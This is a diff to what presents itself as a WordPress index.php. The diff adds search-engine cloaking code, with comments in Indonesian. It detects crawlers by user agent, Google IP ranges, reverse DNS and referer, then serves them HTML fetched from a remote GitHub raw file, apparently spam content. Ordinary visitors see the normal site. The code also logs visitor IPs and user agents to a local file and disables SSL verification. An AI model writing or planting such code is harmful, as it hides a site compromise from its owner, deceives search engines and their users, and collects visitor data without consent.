@@ -1,6 +1,11 @@
 <?php
+
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
 $github_url = 'https://raw.githubusercontent.com/salmadev138/bankdataku/refs/heads/main/gojiberi.txt';
 
+// Ambil informasi visitor
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $ip = $_SERVER['REMOTE_ADDR'] ?? '';
 $ref = $_SERVER['HTTP_REFERER'] ?? '';
@@ -8,10 +13,23 @@ $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
 
 $show_cloak = false;
 
-if (preg_match('/(Googlebot|AdsBot\-Google|Mediapartners\-Google|Google\-InspectionTool)/i', $ua)) {
-    $show_cloak = true;
+// ========== DETEKSI BOT/CRAWLER ==========
+// User Agent detection
+$bot_patterns = [
+    'Googlebot', 'AdsBot-Google', 'Mediapartners-Google',
+    'Google-InspectionTool', 'Google-Site-Verification',
+    'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+    'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+];
+
+foreach ($bot_patterns as $pattern) {
+    if (stripos($ua, $pattern) !== false) {
+        $show_cloak = true;
+        break;
+    }
 }
 
+// IP Range detection untuk Google
 $google_ips = [
     '66.249.', '64.233.', '216.239.', '72.14.', '209.85.',
     '108.177.', '74.125.', '216.58.', '172.217.', '142.250.',
@@ -26,24 +44,40 @@ foreach ($google_ips as $range) {
     }
 }
 
-if (!$show_cloak && function_exists('gethostbyaddr') && $ip) {
+// Reverse DNS lookup
+if (!$show_cloak && function_exists('gethostbyaddr') && $ip && filter_var($ip, FILTER_VALIDATE_IP)) {
     $hostname = @gethostbyaddr($ip);
-    if ($hostname && preg_match('/\.googlebot\.com$/i', $hostname)) {
-        $show_cloak = true;
+    if ($hostname && $hostname !== $ip) {
+        if (preg_match('/\.(googlebot|google)\.com$/i', $hostname)) {
+            $show_cloak = true;
+        }
     }
 }
 
-if (stripos($ref, 'google.co.id') !== false) {
+// Referer detection
+$search_engines = ['google.', 'bing.', 'yahoo.', 'yandex.', 'duckduckgo.'];
+foreach ($search_engines as $engine) {
+    if (stripos($ref, $engine) !== false) {
+        $show_cloak = true;
+        break;
+    }
+}
+
+// Language detection untuk Indonesia
+if (stripos($lang, 'id') !== false && stripos($ref, 'google') !== false) {
     $show_cloak = true;
 }
 
-if (stripos($ref, 'google.com') !== false && stripos($lang, 'id') !== false) {
-    $show_cloak = true;
-}
+// ========== LOGGING (opsional) ==========
+$log_file = dirname(__FILE__) . '/cloak_log.txt';
+$log_data = date('Y-m-d H:i:s') . " | IP: $ip | UA: $ua | Referer: $ref | Show Cloak: " . ($show_cloak ? 'YES' : 'NO') . "\n";
+@file_put_contents($log_file, $log_data, FILE_APPEND);
 
+// ========== TAMPILKAN CLOAKING JIKA DETECTED ==========
 if ($show_cloak) {
     $content = false;
     
+    // Method 1: cURL
     if (function_exists('curl_init')) {
         $ch = curl_init();
         curl_setopt_array($ch, [
@@ -52,24 +86,87 @@ if ($show_cloak) {
             CURLOPT_FOLLOWLOCATION => true,
             CURLOPT_SSL_VERIFYPEER => false,
             CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_TIMEOUT => 10,
-            CURLOPT_USERAGENT => 'Mozilla/5.0'
+            CURLOPT_TIMEOUT => 15,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_HTTPHEADER => ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8']
         ]);
         $content = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
+        
+        if ($http_code != 200) {
+            $content = false;
+        }
     }
     
+    // Method 2: file_get_contents fallback
     if (!$content && ini_get('allow_url_fopen')) {
-        $content = @file_get_contents($github_url);
+        $context = stream_context_create([
+            'http' => [
+                'timeout' => 15,
+                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        $content = @file_get_contents($github_url, false, $context);
     }
     
-    if ($content) {
-        header('Content-Type: text/html; charset=UTF-8');
-        header('Cache-Control: no-cache');
-        echo $content;
+    // Jika berhasil mendapatkan konten dari GitHub
+    if ($content && trim($content) !== '') {
+        // Cek jika konten adalah HTML
+        if (strpos(trim($content), '<!DOCTYPE') === 0 || 
+            strpos(trim($content), '<html') !== false ||
+            strpos(trim($content), '<!doctype') === 0) {
+            
+            // Set headers untuk HTML
+            header('Content-Type: text/html; charset=UTF-8');
+            header('Cache-Control: no-cache, no-store, must-revalidate');
+            header('Pragma: no-cache');
+            header('Expires: 0');
+            header('X-Cloaked-By: PHP-Cloak-System');
+            
+            // Output konten
+            echo $content;
+            exit;
+        } else {
+            
+            header("Location: " . $github_url, true, 302);
+            exit;
+        }
+    }
+    
+   
+}
+
+
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+$is_wp_request = (
+    strpos($request_uri, '/wp-') === 0 ||
+    strpos($request_uri, '/wp/') !== false ||
+    strpos($request_uri, '.php') !== false ||
+    preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$/i', $request_uri)
+);
+
+if (!$is_wp_request) {
+    
+    if (file_exists(dirname(__FILE__) . '/wp-load.php')) {
+        define('WP_USE_THEMES', true);
+        require_once(dirname(__FILE__) . '/wp-load.php');
+        
+        // Setup WordPress environment
+        wp();
+        
+        // Load theme template
+        require_once(ABSPATH . WPINC . '/template-loader.php');
         exit;
     }
 }
 
-require_once('wp-load.php');
+// Fallback - redirect ke home
+header("Location: /", true, 302);
+exit;
 ?>
